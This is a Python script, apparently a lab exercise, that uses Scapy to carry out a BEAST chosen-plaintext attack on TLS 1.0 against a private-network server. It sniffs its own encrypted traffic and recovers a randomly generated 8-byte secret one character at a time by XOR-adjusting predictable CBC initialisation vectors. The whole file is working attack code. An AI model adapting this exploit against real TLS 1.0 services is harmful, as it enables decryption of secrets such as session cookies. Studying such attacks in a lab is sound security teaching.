from scapy.layers.tls.automaton_cli import *
from scapy.layers.tls.automaton import *
from scapy.all import *
import string
import random
from time import sleep

# a helper function that does the XOR
def byte_xor(ba1, ba2):
    return bytes([_a ^ _b for _a, _b in zip(ba1, ba2)])

# simulates a secret string to send via TLSv1
# the secret only contains printable ASCII characters and is 8 bytes long
secret = ''.join(random.choices(string.ascii_uppercase + string.ascii_lowercase + string.digits + string.punctuation, k = 8))
print("Generated session secret: " + secret)

class hacker:
    # simulates a TLS client    
    cli = TLSClientAutomaton.tlslink(Raw, server='10.9.0.3', dport=443, version='tls1')

    # simulates crafted requests to the server with controlled block boundaries
    iv = b''
    total_bytes_found = 0
    current_byte_found = True
    current_byte_trial = 33 # this is '!', the first printable character
    compromised_secret = ''
    reference_block = b''
    reference_iv = b''
    get_reference = False
    def hack(pkt):
        # we only want packets that contain application data
        if TLS not in pkt or pkt[TLS].type != 23:
            return
        # this saves the block for comparison
        if hacker.get_reference:
            hacker.reference_iv = hacker.iv
            hacker.reference_block = raw(pkt[TLS].msg[0])[0:16]
            hacker.get_reference = False
        else:
            # this handles the sniffed ciphertext of a guessed block
            if raw(pkt[TLS].msg[0])[0:16] == hacker.reference_block:
                print("Found a character of the secret: " + chr(hacker.current_byte_trial))
                hacker.compromised_secret += chr(hacker.current_byte_trial)
                hacker.total_bytes_found += 1
                hacker.current_byte_found = True
                if hacker.total_bytes_found == 8:
                    print("BEAST attack success! Found secret: " + hacker.compromised_secret)
                    exit(0)
                else:
                    print("Progress so far: " + hacker.compromised_secret)
            else:
                hacker.current_byte_trial += 1

        
        hacker.iv = raw(pkt[TLS].msg[-1])[-16:]# updates the IV every time
        # this request sends a block with 1 byte of unknown secret, the block is saved for comparison
        if hacker.current_byte_found:
            hacker.current_byte_found = False
            hacker.get_reference = True
            hacker.current_byte_trial = 33
            plaintext = b'A' * (16 - hacker.total_bytes_found - 1) + bytes(secret, 'ascii')
            print("Sending request with plaintext: " + bytes.decode(plaintext))
            hacker.cli.send(plaintext)
            return

        # this request sends a block with 1 byte of guessed secret
        if hacker.current_byte_trial > 126: # last printable character: '~'
            print("Error: Cannot find this character after all guesses!")
            exit(1)
        guessed = b'A' * (16 - hacker.total_bytes_found - 1) + bytes(hacker.compromised_secret, 'ascii') + bytes(chr(hacker.current_byte_trial), 'ascii')
        # first XOR out the correct IV, then add our reference IV
        plaintext = byte_xor(byte_xor(guessed, hacker.iv), hacker.reference_iv)
        hacker.cli.send(plaintext)

sniffer = AsyncSniffer(filter="tcp dst port 443", prn=hacker.hack)
sniffer.start()
hacker.cli.send(b'Hello!') # this is only to get the sniffer's callback started, any content would be fine
while True: # prevent Python from exiting
    sleep(10)